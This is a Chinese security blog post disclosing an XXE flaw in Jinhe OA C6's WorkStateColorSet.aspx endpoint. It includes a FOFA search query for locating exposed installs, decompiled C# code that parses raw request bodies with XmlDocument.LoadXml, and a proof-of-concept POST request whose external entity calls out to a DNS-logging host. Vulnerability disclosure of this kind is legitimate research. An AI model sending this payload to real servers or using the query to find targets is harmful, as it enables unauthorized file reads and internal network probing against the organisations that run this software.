---
title: "金和OA WorkStateColorSet.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-WorkStateColorSet-xxe.html
asset_dir: assets/金和oa-workstatecolorset.aspx-xxe漏洞
---

# 金和OA WorkStateColorSet.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/1/24 13:31
* 183浏览
* [0评论](#comment)
* 15分钟阅读

深入探索

软件

服务器

授权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `WorkStateColorSet.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `WorkStateColorSet.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Govset.dll` 将其进行反编译后找到 **WorkStateColorSet** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  this.htc = ((CultureInfo) this.Session["culture"]).Name + ".css";
  this.Response.Buffer = true;
  this.Response.ExpiresAbsolute = DateTime.Now.AddSeconds(-1.0);
  this.Response.Expires = 0;
  this.Response.CacheControl = "no-cache";
  if (this.Request["state"] != null)
    this.iFlag = this.Request["state"].ToString().Trim();
  if (this.Request["Flag"] != null)
    this.strFlag = this.Request["Flag"].ToString().Trim();
  if (this.Request["ID"] != null)
    this.iID = this.Request["ID"].ToString().Trim();
  this.InitText();
  if (string.op_Inequality(this.strFlag, ""))
  {
    string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.LoadXml(end);
    string innerText = xmlDocument.DocumentElement.ChildNodes[0].InnerText;
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.govset/WorkStateColorSet.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

网络安全

[![金和OA WorkStateColorSet.aspx XXE漏洞](images/img-001-ab40f77f1ff8.webp)](https://image.mrxn.net/b12efeef8c1a4140adbccbbbda98c37e.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA WorkStateColorSet.aspx XXE漏洞](https://mrxn.net/jswz/jhsoft-WorkStateColorSet-xxe.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-WorkStateColorSet-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-WorkStateColorSet-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-WorkStateColorSet-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 